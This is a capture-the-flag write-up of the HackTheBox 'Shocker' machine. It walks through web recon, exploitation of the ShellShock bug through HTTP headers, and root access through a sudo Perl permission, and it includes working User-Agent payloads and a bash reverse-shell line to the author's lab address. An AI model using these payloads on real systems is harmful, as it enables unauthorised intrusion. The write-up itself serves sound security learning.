---
title: HTB: Shocker
url: https://0xdf.gitlab.io/2021/05/25/htb-shocker.html
date: 2021-05-25T09:00:00+00:00
difficulty: Easy [20]
os: Linux
tags: htb-shocker, hackthebox, ctf, nmap, feroxbuster, cgi, shellshock, bashbug, burp, cve-2014-6271, gtfobin, oscp-like-v1
---

![Shocker](https://0xdfimages.gitlab.io/img/shocker-cover.png)

The name Shocker gives away pretty quickly what I’ll need to do on this box. There were a couple things to look out for along the way. First, I’ll need to be careful when directory brute forcing, as the server is misconfigured in that the cgi-bin directory doesn’t show up without a trailing slash. This means that tools like gobuster and feroxbuster miss it in their default state. I’ll show both manually exploiting ShellShock and using the nmap script to identify it is vulnerable. Root is a simple GTFObin in perl. In Beyond Root, I’ll look at the Apache config and go down a rabbit hole looking at what commands cause execution to stop in ShellShock and try to show how I experimented to come up with a theory that seems to explain what’s happening.

## Box Info

| Name | [Shocker](https://hackthebox.com/machines/shocker)  [Shocker](https://hackthebox.com/machines/shocker) [Play on HackTheBox](https://hackthebox.com/machines/shocker) |
| --- | --- |
| Release Date | 30 Sep 2017 |
| Retire Date | 17 Feb 2018 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Shocker |
| Radar Graph | Radar chart for Shocker |
| First Blood User | 00:16:45[dostoevskylabs dostoevskylabs](https://app.hackthebox.com/users/10510) |
| First Blood Root | 00:27:23[dostoevskylabs dostoevskylabs](https://app.hackthebox.com/users/10510) |
| Creator | [mrb3n mrb3n](https://app.hackthebox.com/users/2984) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (2222) and HTTP (80):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.56
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-16 06:29 EDT
Nmap scan report for 10.10.10.56
Host is up (0.025s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 11.18 seconds
oxdf@parrot$ nmap -p 80,2222 -sCV -oA scans/nmap-tcpscripts 10.10.10.56
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-16 06:30 EDT
Nmap scan report for 10.10.10.56
Host is up (0.018s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.35 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 16.04.

### Website - TCP 80

#### Site

The site is incredibly simple:

![image-20210516063155550](https://0xdfimages.gitlab.io/img/image-20210516063155550.png)

The page source is quite short:

```

<!DOCTYPE html>
<html>
<body>

<h2>Don't Bug Me!</h2>
<img src="bug.jpg" alt="bug" style="width:450px;height:350px;">

</body>
</html> 

```

#### Directory Brute Force

[FeroxBuster](https://github.com/epi052/feroxbuster), even with a couple extensions as just a guess, only finds `index.html` and a 403 forbidden on `server-status`, which is typical for Apache:

```

oxdf@parrot$ feroxbuster -u http://10.10.10.56 -x php,html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.2.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.56
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.2.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php, html]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200        9l       13w      137c http://10.10.10.56/index.html
403       11l       32w      299c http://10.10.10.56/server-status
[####################] - 42s   179994/179994  0s      found:2       errors:0      
[####################] - 42s    89997/89997   2133/s  http://10.10.10.56

```

There’s a misconfiguration on Shocker that’s worth understanding. Typically, most webservers will handle a request to a directory without a trailing slash by sending a redirect to the same path but with the trailing slash. But in this case, there is a directory on Shocker that sends a 404 Not Found with visited without the trailing slash. I’ll dig into the configuration and why in [Beyond Root](#apache-config).

Tools like [dirsearch](https://github.com/maurosoria/dirsearch) and `dirb` actually take the input wordlist and loop over each entry sending two requests, with and without the trailing slash. This is really helpful in a case like shocker, but will double the amount of requests sent (and thus time) each time there’s a scan. Both `gobuster` and `feroxbuster` have a `-f` flag to force adding the `/` to the end of directories. For Shocker, running with `-f` does find something else:

```

oxdf@parrot$ feroxbuster -u http://10.10.10.56 -f -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.2.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.56
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.2.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🪓  Add Slash             │ true
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
403       11l       32w      294c http://10.10.10.56/cgi-bin/
403       11l       32w      292c http://10.10.10.56/icons/
403       11l       32w      300c http://10.10.10.56/server-status/
[####################] - 15s    29999/29999   0s      found:3       errors:0      
[####################] - 14s    29999/29999   2039/s  http://10.10.10.56

```

I show with `-n` because crawling in `/server-status` prints a ton with `-f`.

`feroxbuster` again on the `/cgi-bin/` directory with some common script types used for [CGI](https://en.wikipedia.org/wiki/Common_Gateway_Interface):

```

oxdf@parrot$ feroxbuster -u http://10.10.10.56/cgi-bin/ -x sh,cgi,pl

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.2.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.56/cgi-bin/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.2.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [sh, cgi, pl]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200        7l       17w        0c http://10.10.10.56/cgi-bin/user.sh
[####################] - 57s   359988/359988  0s      found:1       errors:0      
[####################] - 57s   119996/119996  2089/s  http://10.10.10.56/cgi-bin/

```

Just one, `user.sh`.

#### user.sh

Visiting `/cgi-bin/user.sh` returns a file that Firefox isn’t sure how to handle:

![image-20210516070304995](https://0xdfimages.gitlab.io/img/image-20210516070304995.png)

Opening it in a text editor shows the content:

```

Content-Type: text/plain

Just an uptime test script

 07:03:54 up 13:33,  0 users,  load average: 0.06, 0.11, 0.04

```

Not important to hacking Shocker, but the reason that Firefox pops the open or save file dialog rather than showing this in the browser can be seen in the raw response (seen in Burp):

![image-20210516070515215](https://0xdfimages.gitlab.io/img/image-20210516070515215.png)

The `Content-Type` header is `text/x-sh`, which is not something Firefox knows what to do with, so it goes to the raw file dialog. It looks like the script maybe trying to add a `text/plain` header, but it’s after the empty line, so it’s in the body not the header.

More importantly, this looks like the output of the `uptime` command in Linux, suggesting this is a CGI bash script running on Shocker:

```

oxdf@parrot$ uptime
 07:08:38 up 5 days, 16:27, 35 users,  load average: 0.00, 0.08, 0.18

```

## Shell as shelly

### ShellShock Background

[ShellShock](https://en.wikipedia.org/wiki/Shellshock_(software_bug)), AKA Bashdoor or CVE-2014-6271, was a vulnerability in Bash discovered in 2014 which has to do with the Bash syntax for defining functions. It allowed an attacker to execute commands in places where it should only be doing something safe like defining an environment variable. An initial POC was this:

```

env x='() { :;}; echo vulnerable' bash -c "echo this is a test"

```

This was a big deal because lots of different programs would take user input and use it to define environment variables, the most famous of which was CGI-based web servers. For example, it’s very typically to store the User-Agent string in an environment variable. And since the UA string is completely attacker controlled, this led to remote code execution on these systems.

### Finding ShellShock

#### Manually

If I’m ok to assume based on the CGI script and the name of that box that ShellShock is the vector here, I can just test is manually. I’ll send the request for `user.sh` over to Burp Repeater and play with it a bit. Because the UA string is a common target, I’ll try adding the POC there:

![image-20210517074858892](https://0xdfimages.gitlab.io/img/image-20210517074858892.png)

Two potential issues to watch out for. First is that commands need full paths, as `$PATH` variable is empty in the environment in which the ShellShock executes.

Next, I need the `echo;` as the first command run for the responses to come back in an HTTP response, but it does run either way. For example, I’ll do a `ping`. Sending `User-Agent: () { :;}; echo; /bin/ping -c 1 10.10.14.15` shows an ICMP packet at `tcpdump` on my VM:

```

07:52:43.101742 IP 10.10.10.56 > 10.10.14.15: ICMP echo request, id 12866, seq 1, length 64
07:52:43.101766 IP 10.10.14.15 > 10.10.10.56: ICMP echo reply, id 12866, seq 1, length 64

```

The results come back in the response:

```

HTTP/1.1 200 OK
Date: Mon, 17 May 2021 11:57:37 GMT
Server: Apache/2.4.18 (Ubuntu)
Connection: close
Content-Type: text/x-sh
Content-Length: 261

PING 10.10.14.15 (10.10.14.15) 56(84) bytes of data.
64 bytes from 10.10.14.15: icmp_seq=1 ttl=63 time=18.9 ms
--- 10.10.14.15 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 18.955/18.955/18.955/0.000 ms

```

If I remove the `echo;`, and send `User-Agent: () { :;}; /bin/ping -c 1 10.10.14.15`, `tcpdump` still sees the ICMP packet, but the response from the server is a 500. I think that without the newline, it puts the output in the HTTP headers, which is non-compliant stuff in the headers, leading to a crash. That said, I wasn’t able to get things like `python3 -c 'print()'` to create the newline and return results (though it prevents the 500). I didn’t have a good explanation as to why, but also couldn’t let it go, so more in [Beyond Root](#shellshock-chained-commands).

#### nmap

`nmap` has a [script](https://nmap.org/nsedoc/scripts/http-shellshock.html) to test for ShellShock. I’ll need to give it the URI for the script to check:

```

oxdf@parrot$ nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.10.10.56
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-16 07:17 EDT
Nmap scan report for 10.10.10.56
Host is up (0.019s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|       http://seclists.org/oss-sec/2014/q3/685
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.66 seconds

```

I captured that in Wireshark to see what it was doing. The request with the exploit check is:

```

GET /cgi-bin/user.sh HTTP/1.1
Connection: close
Referer: () { :;}; echo; echo -n kgbyrbl; echo pkzxdko
Cookie: () { :;}; echo; echo -n kgbyrbl; echo pkzxdko
User-Agent: () { :;}; echo; echo -n kgbyrbl; echo pkzxdko
Host: 10.10.10.56

```

First, it’s worth noting that technically this is executing code on the scanned machine. So while it’s just an `echo`, it’s still RCE, so it’s worth knowing that and making sure you’re within scope / laws / ethics.

The result is multiple prints of the two strings, showing that ShellShock here is successful in `Referer`, `Cookie`, and `User-Agent`.

### Shell

I’ll start a `nc` listener on tcp 443, and then send the following:

```

User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.15/443 0>&1

```

The web request hangs, and I get a shell at `nc`:

```

oxdf@parrot$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.56] 45314
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$

```

I’ll get a full shell with the normal trick:

```

shelly@Shocker:/usr/lib/cgi-bin$ python3 -c 'import pty;pty.spawn("bash")'
python3 -c 'import pty;pty.spawn("bash")'
shelly@Shocker:/usr/lib/cgi-bin$ ^Z
[1]+  Stopped                 nc -lvnp 443
oxdf@parrot$ stty raw -echo ; fg
nc -lvnp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
                                                                         
shelly@Shocker:/usr/lib/cgi-bin$

```

And get `user.txt`:

```

shelly@Shocker:/home/shelly$ cat user.txt
2715b1ad************************

```

## Shell as root

### Enumeration

I also manually check `sudo -l` before uploading any kind of enumeration script, and it pays off here:

```

shelly@Shocker:/home/shelly$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl

```

shelly can run `perl` as root.

### Shell

`perl` has a `-e` option that allows me to run Perl from the command line. It also has an `exec` command that will run shell commands. Putting that together, I can run `bash` as root:

```

shelly@Shocker:/home/shelly$ sudo perl -e 'exec "/bin/bash"'
root@Shocker:/home/shelly#

```

That’s enough to grab `root.txt`:

```

root@Shocker:~# cat root.txt
3675a0fa************************

```

## Beyond Root

### Apache Config

When I first found the `/cgi-bin/` directory on Apache that responded to `/cgi-bin` with a 404 not found, I assumed it would be due to the `DirectorySlash` [Apache directive](http://httpd.apache.org/docs/2.2/mod/mod_dir.html#directoryslash):

> The `DirectorySlash` directive determines whether `mod_dir` should fixup URLs pointing to a directory or not.
>
> Typically if a user requests a resource without a trailing slash, which points to a directory, `mod_dir` redirects him to the same resource, but *with* trailing slash for some good reasons:
>
> - The user is finally requesting the canonical URL of the resource
> - `mod_autoindex` works correctly. Since it doesn’t emit the path in the link, it would point to the wrong path.
> - `DirectoryIndex` will be evaluated *only* for directories requested with trailing slash.
> - Relative URL references inside html pages will work correctly.
>
> If you don’t want this effect *and* the reasons above don’t apply to you, you can turn off the redirect as shown below.

The default for this directive is `On`, meaning the redirect is the default behavior.

But after rooting, I couldn’t find this directive. I also noticed that `cgi-bin` wasn’t in `/var/www/html`:

```

root@Shocker:/var/www/html# ls
bug.jpg  index.html

```

It is apparently standard practice to store CGI scripts in `/usr/lib`. In fact, when I first landed a shell, the current directory was `/usr/lib/cgi-bin`.

The mystery unlocked when I started looking at the other Apache config files, specifically `/etc/apache2/conf-enabled/serve-cgi-bin.conf`:

```

<IfModule mod_alias.c>
        <IfModule mod_cgi.c>
                Define ENABLE_USR_LIB_CGI_BIN
        </IfModule>

        <IfModule mod_cgid.c>
                Define ENABLE_USR_LIB_CGI_BIN
        </IfModule>

        <IfDefine ENABLE_USR_LIB_CGI_BIN>
                ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
                <Directory "/usr/lib/cgi-bin">
                        AllowOverride None
                        Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
                        Require all granted
                </Directory>
        </IfDefine>
</IfModule>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

```

The line `ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/` will match on requests to `/cgi-bin/` and alias them into the `/usr/lib/cgi-bin/` directory. But it only matches if there’s a trailing slash!

To test this, I removed the trailing slash, leaving:

```

ScriptAlias /cgi-bin /usr/lib/cgi-bin/

```

Then I reset Apache on Shocker (`service apache2 restart`,) and did a `curl`:

```

oxdf@parrot$ curl http://10.10.10.56/cgi-bin
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://10.10.10.56/cgi-bin/">here</a>.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80</address>
</body></html>

```

It returned 301 moved permanently.

When I added the slash back into the config and restarted Apache again, it went back to 404:

```

oxdf@parrot$ curl http://10.10.10.56/cgi-bin
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /cgi-bin was not found on this server.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80</address>
</body></html>

```

### ShellShock Chained Commands

I noticed that I needed to start with an `echo` in order for the ShellShock results to come back in the HTTP request, or else the server returned 500. I figured that was to separate the HTTP header from the body, and without that, Apache is crashing. To test this theory, I tried to replace `echo` with `python3 -c 'print()'`, and something strange happened. It didn’t crash, but it didn’t return any data either.

I started down a series of experiment until I think I figured out what was going on.

My first thought was that perhaps Python and `echo` were outputting different information. At least on my machine this wasn’t the case:

```

oxdf@parrot$ python3 -c 'print()' | xxd
00000000: 0a                                       .
oxdf@parrot$ echo | xxd
00000000: 0a 

```

Looking at how each finished didn’t show much difference either:

```

oxdf@parrot$ strace echo
...[snip]...
write(1, "\n", 1
)                       = 1
close(1)                                = 0
close(2)                                = 0
exit_group(0)                           = ?
+++ exited with 0 +++

oxdf@parrot$ strace python3 -c 'print()'
...[snip]...
write(1, "\n", 1
)                       = 1
rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fd36b83a140}, {sa_handler=0x6402c0, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fd36b83a140}, 8) = 0
brk(0xdc5000)                           = 0xdc5000
exit_group(0)                           = ?
+++ exited with 0 +++

```

I started doing experiments to see what the issue could be.

| UA String | HTTP Code | Pings at tcpdump | Output in Resp |
| --- | --- | --- | --- |
| `User-Agent: () { :;}; /usr/bin/python3 -c 'import os;os.system("echo")'; /bin/ping -c 1 10.10.14.15` | 200 | 0 | None |
| `User-Agent: () { :;}; /usr/bin/python3 -c 'import os;os.system("/bin/ping -c 1 10.10.14.15")'; /bin/ping -c 1 10.10.14.15` | 500 | 1 | Error |
| `User-Agent: () { :;}; /usr/bin/python3 -c 'import os;os.system("echo; /bin/ping -c 2 10.10.14.15")'; /bin/ping -c 1 10.10.14.15` | 200 | 2 | Ping results from Python |
| `User-Agent: () { :;}; echo; /usr/bin/python3 -c 'import os; os.system("/bin/ping -c 1 10.10.14.15")'; /usr/bin/id` | 200 | 1 | Ping results |

I noticed pretty quickly that nothing after Python runs. I spent a while trying to figure out what was weird about Python, but that was the wrong way to look at it. I eventually tried Perl:

| UA String | HTTP Code | Pings at tcpdump | Output in Resp |
| --- | --- | --- | --- |
| `User-Agent: () { :;}; /usr/bin/perl -e 'print "\n"'; /bin/ping -c 1 10.10.14.15` | 200 | 0 | None |

Same result. What about `ping` after `ping`?

| UA String | HTTP Code | Pings at tcpdump | Output in Resp |
| --- | --- | --- | --- |
| `User-Agent: () { :;}; echo; /bin/ping -c 1 10.10.14.15; /bin/ping -c 1 10.10.14.15; /bin/ping -c 1 10.10.14.15;` | 200 | 1 | One set of pings |

It’s looking more and more that any command kills the execution. So why not `echo`? Well, `echo` is a Bash builtin. What about other builtins (see `man bash`), like `printf` and `dirs`?

| UA String | HTTP Code | Pings at tcpdump | Output in Resp |
| --- | --- | --- | --- |
| `User-Agent: () { :;}; printf "\n"; /usr/bin/id` | 200 | N/A | `id` |
| `User-Agent: () { :;}; echo; dirs; /usr/bin/id` | 200 | N/A | output of `dirs` and `id` |

At this point, I don’t have any proof (I could go debugging Apache, but ugh, threads, sounds like a huge pain). I do have a good theory that I can’t find counter-examples for, and it’s this: Shellshock will run as many Bash builtins as given up to the first binary called and then stop. A slight caveat to that is that pipes don’t seem to break it. For example, I can pipe `id` into `cut` to get the first 10 characters of output without issue, even though neither `cut` nor `id` are builtins:

![image-20210517213416440](https://0xdfimages.gitlab.io/img/image-20210517213416440.png)

`;`, `&&`, and `||` following a all seem to break execution at that point.